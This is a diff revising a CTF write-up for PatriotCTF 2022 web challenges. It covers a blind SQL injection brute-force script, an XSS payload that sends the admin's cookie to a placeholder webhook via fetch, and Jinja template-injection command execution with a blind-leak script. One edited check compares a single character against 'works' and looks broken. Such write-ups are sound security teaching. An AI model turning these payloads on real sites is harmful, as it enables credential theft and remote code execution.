@@ -37,7 +37,7 @@ def detect_sqli(username, password):
         return (False, )
 ```  
 
-The challenge this time, in contrast to before, is that you have to brute-force the admin's password, as opposed to just logging in as the admin. The filters are easily bypassed: you can simply capitalise "or" and "and" and you can just concatenate "adm" and "in" to get "admin". We can build up the password by brute-forcing each character in turn by using some special SQL syntax. The request looks like this:
+The challenge this time, in contrast to before, is that you have to brute-force the admin's password as opposed to just logging in as the admin. The filters are easily bypassed: you can simply capitalise "or" and "and" and you can just concatenate "adm" and "in" to get "admin". We can build up the password by brute-forcing each character in turn by using some special SQL syntax. The request looks like this:
 
 ```
 Username: adm'||'in
@@ -54,7 +54,7 @@ SELECT * FROM Users WHERE username = '{inp_username}' AND password = '{inp_passw
 SELECT * FROM Users WHERE username = 'adm'||'in' AND password = '' OR SUBSTR(`passwOrd`, {pos}, 1) = '{c}';
 ```  
 
-...leading to us being able to login if and only if `c` matches with the character in the password at index `pos`. Here's the script.
+The logic behind this is that the `WHERE` clause will only evaluate to true when the username is `'adm'||'in'` and the password is either empty (verifiably untrue) or has the character at index `pos` matching our brute-forced character `c`. This leads to us being able to login if and only if `c` matches with the character in the admin's password at index `pos`. We'll be able to tell if we've logged in successfully, as the error message won't appear in the HTML response, so we can automate this using a script. Here's the one I wrote.
 
 ```py
 import requests
@@ -87,7 +87,7 @@ while True:
     print(c, end="")
 ```  
 
-After you get the password, submit another request but replace the brute-forcing password query with your output to get the flag.
+Log in to the admin account with this password you've just found, and this reveals the flag.
 
 ---
 
@@ -99,7 +99,12 @@ After you get the password, submit another request but replace the brute-forcing
 
 From the challenge description and due to the fact that you can send messages to the mysterious entity `admin`, this seems like an XSS challenge, so let's try to steal the admin's cookies.  
 
-There is a filter on all messages that blocks these characters: `.>{}`, and a payload that works is `<img src=x onerror="javascript:ghurwiejiowrobw" `, as due to the trailing space, any subsequent HTML is then treated either as part of a new attribute or as the closing part of the tag. Submitting this payload with some javascript to exfiltrate the admin's cookie then logging in as the admin yields the flag.
+There is a filter on all messages that blocks these characters: `.>{}`, so using a `<script>` tag won't work as you can never end the opening tag to start writing your JavaScript code. However, `<img>` tags can have JavaScript code be executed via use of event handler attributes such as `onerror`, and a payload that works is `<img src=x onerror="javascript:your_payload_here" `, as due to the trailing space, any subsequent HTML is then treated either as part of a new attribute or as the closing part of the tag (if it's `>`). Submitting this payload with some javascript to exfiltrate the admin's cookie then logging in as the admin yields the flag.
+
+```html
+<!-- The src=x raises an error (404 not found) to trigger the onerror event handler. -->
+<img src=x onerror="fetch('https://webhook_link/' + document.cookie);" 
+```
 
 ---
 
@@ -143,7 +148,7 @@ cycler.__init__.__globals__.os.popen('id').read()
 
 ...which achieves the same result, less effectively.  
 
-There is a small issue, which is that using Jinja tags, we can't actually directly get the output of our executed commands. However, there is a workaround. We can use `{% if %}` to determine if a certain character exists at a certain index in the output of a command, and to output something to the page if so, similar to the SQL brute-force from before. During the competition I thought that this was far too slow to be the intended solution, but it [wasn't](https://github.com/MasonCompetitiveCyber/PatriotCTF2022-Public/tree/main/Web/Mr%20O), and here's the incredibly hackish script.
+There is a small issue, which is that using Jinja tags, we can't actually directly get the output of our executed commands. However, there is a workaround. We can use `{% if %}` to determine if a certain character exists at a certain index in the output of a command, and to output something to the page if so, similar to the SQL brute-force from before. We can test if anything was indeed output to the page by inspecting the HTML response to leak the results of our comparison. During the competition I thought that this was far too slow to be the intended solution, but it [wasn't](https://github.com/MasonCompetitiveCyber/PatriotCTF2022-Public/tree/main/Web/Mr%20O), and here's the incredibly hackish script I wrote.
 
 ```py
 import requests
@@ -169,12 +174,12 @@ while True:
     }
     r = s.post(url, cookies=cook, data=data).text
 
-    if r.split("Just sent your message: ")[1][0] != "<": # if "works" is output
-        i += 1
-        print(str(bytes.fromhex(c[2:]))[2:-1], end = "")
-        c_i = 0
+    if r.split("Just sent your message: ")[1][0].startswith("works"): # if "works" is output, ie the character we guessed, c, does indeed exist in the output at index i
+        i += 1 # ...so move onto the next index
+        print(str(bytes.fromhex(c[2:]))[2:-1], end = "") # ...add it on to our known output
+        c_i = 0 # ...and reset back to the first character to brute force once again
     else:
-        c_i += 1
+        c_i += 1 # otherwise, it didn't work, so test the next character
 ```
 
 ---
